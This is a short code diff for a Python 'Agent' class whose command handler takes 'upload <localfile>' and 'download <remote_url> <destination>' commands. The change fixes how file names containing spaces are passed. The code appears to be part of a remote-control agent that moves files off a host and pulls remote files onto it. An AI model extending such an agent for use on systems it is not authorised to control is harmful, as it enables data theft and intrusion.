@@ -313,7 +313,7 @@ class Agent(object):
                             if not args:
                                 self.send_output('usage: upload <localfile>')
                             else:
-                                self.upload(args[0],)
+                                self.upload(' '.join(args[0:]),)
                         elif command == 'download':
                             if not args:
                                 self.send_output('usage: download <remote_url> <destination>')
